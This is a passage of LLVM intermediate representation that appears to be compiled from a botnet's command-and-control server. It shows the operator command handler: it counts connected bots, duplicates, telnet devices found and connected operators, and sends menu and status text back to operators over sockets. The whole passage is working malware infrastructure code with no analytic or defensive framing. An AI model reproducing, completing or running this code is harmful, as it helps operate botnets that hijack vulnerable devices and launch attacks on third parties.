  br label %1345

510:                                              ; preds = %502
  %511 = load i32, i32* %5, align 4
  %512 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %513 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %514 = call i64 @strlen(i8* %513) #8
  %515 = call i64 @send(i32 %511, i8* %512, i64 %514, i32 16384)
  %516 = icmp eq i64 %515, -1
  br i1 %516, label %517, label %518

517:                                              ; preds = %510
  store i8* null, i8** %2, align 8
  br label %1345

518:                                              ; preds = %510
  %519 = load i32, i32* %5, align 4
  %520 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %521 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %522 = call i64 @strlen(i8* %521) #8
  %523 = call i64 @send(i32 %519, i8* %520, i64 %522, i32 16384)
  %524 = icmp eq i64 %523, -1
  br i1 %524, label %525, label %526

525:                                              ; preds = %518
  store i8* null, i8** %2, align 8
  br label %1345

526:                                              ; preds = %518
  br label %527

527:                                              ; preds = %526, %478
  %528 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %529 = call i8* @strstr(i8* %528, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i64 0, i64 0)) #8
  %530 = icmp ne i8* %529, null
  br i1 %530, label %531, label %576

531:                                              ; preds = %527
  %532 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %533 = call i32 @BotsConnected()
  %534 = call i32 (i8*, i8*, ...) @sprintf(i8* %532, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.63, i64 0, i64 0), i32 %533) #9
  %535 = getelementptr inbounds [2048 x i8], [2048 x i8]* %14, i64 0, i64 0
  %536 = load volatile i32, i32* @dups, align 4
  %537 = call i32 (i8*, i8*, ...) @sprintf(i8* %535, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.64, i64 0, i64 0), i32 %536) #9
  %538 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %539 = load volatile i32, i32* @TELFound, align 4
  %540 = call i32 (i8*, i8*, ...) @sprintf(i8* %538, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.65, i64 0, i64 0), i32 %539) #9
  %541 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %542 = load volatile i32, i32* @OperatorsConnected, align 4
  %543 = call i32 (i8*, i8*, ...) @sprintf(i8* %541, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.66, i64 0, i64 0), i32 %542) #9
  %544 = load i32, i32* %5, align 4
  %545 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %546 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %547 = call i64 @strlen(i8* %546) #8
  %548 = call i64 @send(i32 %544, i8* %545, i64 %547, i32 16384)
  %549 = icmp eq i64 %548, -1
  br i1 %549, label %550, label %551

550:                                              ; preds = %531
  store i8* null, i8** %2, align 8
  br label %1345

551:                                              ; preds = %531
  %552 = load i32, i32* %5, align 4
  %553 = getelementptr inbounds [2048 x i8], [2048 x i8]* %14, i64 0, i64 0
  %554 = getelementptr inbounds [2048 x i8], [2048 x i8]* %14, i64 0, i64 0
  %555 = call i64 @strlen(i8* %554) #8
  %556 = call i64 @send(i32 %552, i8* %553, i64 %555, i32 16384)
  %557 = icmp eq i64 %556, -1
  br i1 %557, label %558, label %559

558:                                              ; preds = %551
  store i8* null, i8** %2, align 8
  br label %1345

559:                                              ; preds = %551
  %560 = load i32, i32* %5, align 4
  %561 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %562 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %563 = call i64 @strlen(i8* %562) #8
  %564 = call i64 @send(i32 %560, i8* %561, i64 %563, i32 16384)
  %565 = icmp eq i64 %564, -1
  br i1 %565, label %566, label %567

566:                                              ; preds = %559
  store i8* null, i8** %2, align 8
  br label %1345

567:                                              ; preds = %559
  %568 = load i32, i32* %5, align 4
  %569 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %570 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %571 = call i64 @strlen(i8* %570) #8
  %572 = call i64 @send(i32 %568, i8* %569, i64 %571, i32 16384)
  %573 = icmp eq i64 %572, -1
  br i1 %573, label %574, label %575

574:                                              ; preds = %567
  store i8* null, i8** %2, align 8
  br label %1345

575:                                              ; preds = %567
  br label %576

576:                                              ; preds = %575, %527
  %577 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %578 = call i8* @strstr(i8* %577, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.69, i64 0, i64 0)) #8
  %579 = icmp ne i8* %578, null
  br i1 %579, label %580, label %591

580:                                              ; preds = %576
  %581 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %582 = call i32 (i8*, i8*, ...) @sprintf(i8* %581, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.70, i64 0, i64 0)) #9
  %583 = load i32, i32* %5, align 4
  %584 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %585 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %586 = call i64 @strlen(i8* %585) #8
  %587 = call i64 @send(i32 %583, i8* %584, i64 %586, i32 16384)
  %588 = icmp eq i64 %587, -1
  br i1 %588, label %589, label %590

589:                                              ; preds = %580
  store i8* null, i8** %2, align 8
  br label %1345

590:                                              ; preds = %580
  br label %591

591:                                              ; preds = %590, %576
  %592 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %593 = call i8* @strstr(i8* %592, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.71, i64 0, i64 0)) #8
  %594 = icmp ne i8* %593, null
  br i1 %594, label %595, label %606

595:                                              ; preds = %591
  %596 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %597 = call i32 (i8*, i8*, ...) @sprintf(i8* %596, i8* getelementptr inbounds ([163 x i8], [163 x i8]* @.str.72, i64 0, i64 0)) #9
  %598 = load i32, i32* %5, align 4
  %599 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %600 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %601 = call i64 @strlen(i8* %600) #8
  %602 = call i64 @send(i32 %598, i8* %599, i64 %601, i32 16384)
  %603 = icmp eq i64 %602, -1
  br i1 %603, label %604, label %605

604:                                              ; preds = %595
  store i8* null, i8** %2, align 8
  br label %1345

605:                                              ; preds = %595
  br label %606

606:                                              ; preds = %605, %591
  %607 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %608 = call i8* @strstr(i8* %607, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.73, i64 0, i64 0)) #8
  %609 = icmp ne i8* %608, null
  br i1 %609, label %610, label %621

610:                                              ; preds = %606
  %611 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %612 = call i32 (i8*, i8*, ...) @sprintf(i8* %611, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.74, i64 0, i64 0)) #9
  %613 = load i32, i32* %5, align 4
  %614 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %615 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %616 = call i64 @strlen(i8* %615) #8
  %617 = call i64 @send(i32 %613, i8* %614, i64 %616, i32 16384)
  %618 = icmp eq i64 %617, -1
  br i1 %618, label %619, label %620

619:                                              ; preds = %610
  store i8* null, i8** %2, align 8
  br label %1345

620:                                              ; preds = %610
  br label %621

621:                                              ; preds = %620, %606
  %622 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %623 = call i8* @strstr(i8* %622, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.75, i64 0, i64 0)) #8
  %624 = icmp ne i8* %623, null
  br i1 %624, label %625, label %636

625:                                              ; preds = %621
  %626 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %627 = call i32 (i8*, i8*, ...) @sprintf(i8* %626, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.76, i64 0, i64 0)) #9
  %628 = load i32, i32* %5, align 4
  %629 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %630 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %631 = call i64 @strlen(i8* %630) #8
  %632 = call i64 @send(i32 %628, i8* %629, i64 %631, i32 16384)
  %633 = icmp eq i64 %632, -1
  br i1 %633, label %634, label %635

634:                                              ; preds = %625
  store i8* null, i8** %2, align 8
  br label %1345

635:                                              ; preds = %625
  br label %636

636:                                              ; preds = %635, %621
  %637 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %638 = call i8* @strstr(i8* %637, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.77, i64 0, i64 0)) #8
  %639 = icmp ne i8* %638, null
  br i1 %639, label %640, label %651

640:                                              ; preds = %636
  %641 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %642 = call i32 (i8*, i8*, ...) @sprintf(i8* %641, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.78, i64 0, i64 0)) #9
  %643 = load i32, i32* %5, align 4
  %644 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %645 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %646 = call i64 @strlen(i8* %645) #8
  %647 = call i64 @send(i32 %643, i8* %644, i64 %646, i32 16384)
  %648 = icmp eq i64 %647, -1
  br i1 %648, label %649, label %650

649:                                              ; preds = %640
  store i8* null, i8** %2, align 8
  br label %1345

650:                                              ; preds = %640
  br label %651

651:                                              ; preds = %650, %636
  %652 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %653 = call i8* @strstr(i8* %652, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.79, i64 0, i64 0)) #8
  %654 = icmp ne i8* %653, null
  br i1 %654, label %655, label %666

655:                                              ; preds = %651
  %656 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %657 = call i32 (i8*, i8*, ...) @sprintf(i8* %656, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.80, i64 0, i64 0)) #9
  %658 = load i32, i32* %5, align 4
  %659 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %660 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %661 = call i64 @strlen(i8* %660) #8
  %662 = call i64 @send(i32 %658, i8* %659, i64 %661, i32 16384)
  %663 = icmp eq i64 %662, -1
  br i1 %663, label %664, label %665

664:                                              ; preds = %655
  store i8* null, i8** %2, align 8
  br label %1345

665:                                              ; preds = %655
  br label %666

666:                                              ; preds = %665, %651
  %667 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %668 = call i8* @strstr(i8* %667, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.81, i64 0, i64 0)) #8
  %669 = icmp ne i8* %668, null
  br i1 %669, label %670, label %681

670:                                              ; preds = %666
  %671 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %672 = call i32 (i8*, i8*, ...) @sprintf(i8* %671, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.82, i64 0, i64 0)) #9
  %673 = load i32, i32* %5, align 4
  %674 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %675 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %676 = call i64 @strlen(i8* %675) #8
  %677 = call i64 @send(i32 %673, i8* %674, i64 %676, i32 16384)
  %678 = icmp eq i64 %677, -1
  br i1 %678, label %679, label %680

679:                                              ; preds = %670
  store i8* null, i8** %2, align 8
  br label %1345

680:                                              ; preds = %670
  br label %681

681:                                              ; preds = %680, %666
  %682 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %683 = call i8* @strstr(i8* %682, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.83, i64 0, i64 0)) #8
  %684 = icmp ne i8* %683, null
  br i1 %684, label %685, label %696

685:                                              ; preds = %681
  %686 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %687 = call i32 (i8*, i8*, ...) @sprintf(i8* %686, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.84, i64 0, i64 0)) #9
  %688 = load i32, i32* %5, align 4
  %689 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %690 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %691 = call i64 @strlen(i8* %690) #8
  %692 = call i64 @send(i32 %688, i8* %689, i64 %691, i32 16384)
  %693 = icmp eq i64 %692, -1
  br i1 %693, label %694, label %695

694:                                              ; preds = %685
  store i8* null, i8** %2, align 8
  br label %1345

695:                                              ; preds = %685
  br label %696

696:                                              ; preds = %695, %681
  %697 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %698 = call i8* @strstr(i8* %697, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.85, i64 0, i64 0)) #8
  %699 = icmp ne i8* %698, null
  br i1 %699, label %700, label %711

700:                                              ; preds = %696
  %701 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %702 = call i32 (i8*, i8*, ...) @sprintf(i8* %701, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.86, i64 0, i64 0)) #9
  %703 = load i32, i32* %5, align 4
  %704 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %705 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %706 = call i64 @strlen(i8* %705) #8
  %707 = call i64 @send(i32 %703, i8* %704, i64 %706, i32 16384)
  %708 = icmp eq i64 %707, -1
  br i1 %708, label %709, label %710

709:                                              ; preds = %700
  store i8* null, i8** %2, align 8
  br label %1345

710:                                              ; preds = %700
  br label %711

711:                                              ; preds = %710, %696
  %712 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %713 = call i8* @strstr(i8* %712, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.87, i64 0, i64 0)) #8
  %714 = icmp ne i8* %713, null
  br i1 %714, label %715, label %726

715:                                              ; preds = %711
  %716 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %717 = call i32 (i8*, i8*, ...) @sprintf(i8* %716, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.88, i64 0, i64 0)) #9
  %718 = load i32, i32* %5, align 4
  %719 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %720 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %721 = call i64 @strlen(i8* %720) #8
  %722 = call i64 @send(i32 %718, i8* %719, i64 %721, i32 16384)
  %723 = icmp eq i64 %722, -1
  br i1 %723, label %724, label %725

724:                                              ; preds = %715
  store i8* null, i8** %2, align 8
  br label %1345

725:                                              ; preds = %715
  br label %726

726:                                              ; preds = %725, %711
  %727 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %728 = call i8* @strstr(i8* %727, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.89, i64 0, i64 0)) #8
  %729 = icmp ne i8* %728, null
  br i1 %729, label %730, label %741

730:                                              ; preds = %726
  %731 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %732 = call i32 (i8*, i8*, ...) @sprintf(i8* %731, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.90, i64 0, i64 0)) #9
  %733 = load i32, i32* %5, align 4
  %734 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %735 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %736 = call i64 @strlen(i8* %735) #8
  %737 = call i64 @send(i32 %733, i8* %734, i64 %736, i32 16384)
  %738 = icmp eq i64 %737, -1
  br i1 %738, label %739, label %740

739:                                              ; preds = %730
  store i8* null, i8** %2, align 8
  br label %1345

740:                                              ; preds = %730
  br label %741

741:                                              ; preds = %740, %726
  %742 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %743 = call i8* @strstr(i8* %742, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.91, i64 0, i64 0)) #8
  %744 = icmp ne i8* %743, null
  br i1 %744, label %745, label %756

745:                                              ; preds = %741
  %746 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %747 = call i32 (i8*, i8*, ...) @sprintf(i8* %746, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.92, i64 0, i64 0)) #9
  %748 = load i32, i32* %5, align 4
  %749 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %750 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %751 = call i64 @strlen(i8* %750) #8
  %752 = call i64 @send(i32 %748, i8* %749, i64 %751, i32 16384)
  %753 = icmp eq i64 %752, -1
  br i1 %753, label %754, label %755

754:                                              ; preds = %745
  store i8* null, i8** %2, align 8
  br label %1345

755:                                              ; preds = %745
  br label %756

756:                                              ; preds = %755, %741
  %757 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %758 = call i8* @strstr(i8* %757, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.93, i64 0, i64 0)) #8
  %759 = icmp ne i8* %758, null
  br i1 %759, label %760, label %771

760:                                              ; preds = %756
  %761 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %762 = call i32 (i8*, i8*, ...) @sprintf(i8* %761, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.94, i64 0, i64 0)) #9
  %763 = load i32, i32* %5, align 4
  %764 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %765 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %766 = call i64 @strlen(i8* %765) #8
  %767 = call i64 @send(i32 %763, i8* %764, i64 %766, i32 16384)
  %768 = icmp eq i64 %767, -1
  br i1 %768, label %769, label %770

769:                                              ; preds = %760
  store i8* null, i8** %2, align 8
  br label %1345

770:                                              ; preds = %760
  br label %771

771:                                              ; preds = %770, %756
  %772 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %773 = call i8* @strstr(i8* %772, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.95, i64 0, i64 0)) #8
  %774 = icmp ne i8* %773, null
  br i1 %774, label %775, label %786

775:                                              ; preds = %771
  %776 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %777 = call i32 (i8*, i8*, ...) @sprintf(i8* %776, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.96, i64 0, i64 0)) #9
  %778 = load i32, i32* %5, align 4
  %779 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %780 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %781 = call i64 @strlen(i8* %780) #8
  %782 = call i64 @send(i32 %778, i8* %779, i64 %781, i32 16384)
  %783 = icmp eq i64 %782, -1
  br i1 %783, label %784, label %785

784:                                              ; preds = %775
  store i8* null, i8** %2, align 8
  br label %1345

785:                                              ; preds = %775
  br label %786

786:                                              ; preds = %785, %771
  %787 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %788 = call i8* @strstr(i8* %787, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.97, i64 0, i64 0)) #8
  %789 = icmp ne i8* %788, null
  br i1 %789, label %790, label %801

790:                                              ; preds = %786
  %791 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %792 = call i32 (i8*, i8*, ...) @sprintf(i8* %791, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.98, i64 0, i64 0)) #9
  %793 = load i32, i32* %5, align 4
  %794 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %795 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %796 = call i64 @strlen(i8* %795) #8
  %797 = call i64 @send(i32 %793, i8* %794, i64 %796, i32 16384)
  %798 = icmp eq i64 %797, -1
  br i1 %798, label %799, label %800

799:                                              ; preds = %790
  store i8* null, i8** %2, align 8
  br label %1345

800:                                              ; preds = %790
  br label %801

801:                                              ; preds = %800, %786
  %802 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %803 = call i8* @strstr(i8* %802, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.99, i64 0, i64 0)) #8
  %804 = icmp ne i8* %803, null
  br i1 %804, label %805, label %816

805:                                              ; preds = %801
  %806 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %807 = call i32 (i8*, i8*, ...) @sprintf(i8* %806, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.100, i64 0, i64 0)) #9
  %808 = load i32, i32* %5, align 4
  %809 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %810 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %811 = call i64 @strlen(i8* %810) #8
  %812 = call i64 @send(i32 %808, i8* %809, i64 %811, i32 16384)
  %813 = icmp eq i64 %812, -1
  br i1 %813, label %814, label %815

814:                                              ; preds = %805
  store i8* null, i8** %2, align 8
  br label %1345

815:                                              ; preds = %805
  br label %816

816:                                              ; preds = %815, %801
  %817 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %818 = call i8* @strstr(i8* %817, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.101, i64 0, i64 0)) #8
  %819 = icmp ne i8* %818, null
  br i1 %819, label %820, label %831

820:                                              ; preds = %816
  %821 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %822 = call i32 (i8*, i8*, ...) @sprintf(i8* %821, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.102, i64 0, i64 0)) #9
  %823 = load i32, i32* %5, align 4
  %824 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %825 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %826 = call i64 @strlen(i8* %825) #8
  %827 = call i64 @send(i32 %823, i8* %824, i64 %826, i32 16384)
  %828 = icmp eq i64 %827, -1
  br i1 %828, label %829, label %830

829:                                              ; preds = %820
  store i8* null, i8** %2, align 8
  br label %1345

830:                                              ; preds = %820
  br label %831

831:                                              ; preds = %830, %816
  %832 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %833 = call i8* @strstr(i8* %832, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.103, i64 0, i64 0)) #8
  %834 = icmp ne i8* %833, null
  br i1 %834, label %835, label %846

835:                                              ; preds = %831
  %836 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %837 = call i32 (i8*, i8*, ...) @sprintf(i8* %836, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.104, i64 0, i64 0)) #9
  %838 = load i32, i32* %5, align 4
  %839 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %840 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %841 = call i64 @strlen(i8* %840) #8
  %842 = call i64 @send(i32 %838, i8* %839, i64 %841, i32 16384)
  %843 = icmp eq i64 %842, -1
  br i1 %843, label %844, label %845

844:                                              ; preds = %835
  store i8* null, i8** %2, align 8
  br label %1345

845:                                              ; preds = %835
  br label %846

846:                                              ; preds = %845, %831
  %847 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %848 = call i8* @strstr(i8* %847, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.105, i64 0, i64 0)) #8
  %849 = icmp ne i8* %848, null
  br i1 %849, label %850, label %890

850:                                              ; preds = %846
  %851 = load i8*, i8** %3, align 8
  %852 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %851) #9
  %853 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i64 0, i64 0
  %854 = call i32 (i8*, i8*, ...) @sprintf(i8* %853, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.106, i64 0, i64 0)) #9
  %855 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i64 0, i64 0
  %856 = call i32 (i8*, i8*, ...) @sprintf(i8* %855, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.107, i64 0, i64 0)) #9
  %857 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i64 0, i64 0
  %858 = call i32 (i8*, i8*, ...) @sprintf(i8* %857, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.108, i64 0, i64 0)) #9
  %859 = load i32, i32* %5, align 4
  %860 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i64 0, i64 0
  %861 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i64 0, i64 0
  %862 = call i64 @strlen(i8* %861) #8
  %863 = call i64 @send(i32 %859, i8* %860, i64 %862, i32 16384)
  %864 = icmp eq i64 %863, -1
  br i1 %864, label %865, label %866

865:                                              ; preds = %850
  br label %1336

866:                                              ; preds = %850
  %867 = load i32, i32* %5, align 4
  %868 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i64 0, i64 0
  %869 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i64 0, i64 0
  %870 = call i64 @strlen(i8* %869) #8
  %871 = call i64 @send(i32 %867, i8* %868, i64 %870, i32 16384)
  %872 = icmp eq i64 %871, -1
  br i1 %872, label %873, label %874

873:                                              ; preds = %866
  br label %1336

874:                                              ; preds = %866
  %875 = load i32, i32* %5, align 4
  %876 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i64 0, i64 0
  %877 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i64 0, i64 0
  %878 = call i64 @strlen(i8* %877) #8
  %879 = call i64 @send(i32 %875, i8* %876, i64 %878, i32 16384)
  %880 = icmp eq i64 %879, -1
  br i1 %880, label %881, label %882

881:                                              ; preds = %874
  br label %1336

882:                                              ; preds = %874
  %883 = load i8*, i8** %3, align 8
  %884 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %883) #9
  %885 = load i32, i32* %5, align 4
  %886 = call i64 @send(i32 %885, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.53, i64 0, i64 0), i64 13, i32 16384)
  %887 = icmp eq i64 %886, -1
  br i1 %887, label %888, label %889

888:                                              ; preds = %882
  br label %1336

889:                                              ; preds = %882
  br label %342, !llvm.loop !26

890:                                              ; preds = %846
  %891 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %892 = call i8* @strstr(i8* %891, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.109, i64 0, i64 0)) #8
  %893 = icmp ne i8* %892, null
  br i1 %893, label %894, label %984

894:                                              ; preds = %890
  %895 = load i8*, i8** %3, align 8
  %896 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %895) #9
  %897 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i64 0, i64 0
  %898 = call i32 (i8*, i8*, ...) @sprintf(i8* %897, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.110, i64 0, i64 0)) #9
  %899 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i64 0, i64 0
  %900 = call i32 (i8*, i8*, ...) @sprintf(i8* %899, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.111, i64 0, i64 0)) #9
  %901 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i64 0, i64 0
  %902 = call i32 (i8*, i8*, ...) @sprintf(i8* %901, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.112, i64 0, i64 0)) #9
  %903 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i64 0, i64 0
  %904 = call i32 (i8*, i8*, ...) @sprintf(i8* %903, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.113, i64 0, i64 0)) #9
  %905 = getelementptr inbounds [80 x i8], [80 x i8]* %53, i64 0, i64 0
  %906 = call i32 (i8*, i8*, ...) @sprintf(i8* %905, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.114, i64 0, i64 0)) #9
  %907 = getelementptr inbounds [80 x i8], [80 x i8]* %54, i64 0, i64 0
  %908 = call i32 (i8*, i8*, ...) @sprintf(i8* %907, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.115, i64 0, i64 0)) #9
  %909 = getelementptr inbounds [80 x i8], [80 x i8]* %55, i64 0, i64 0
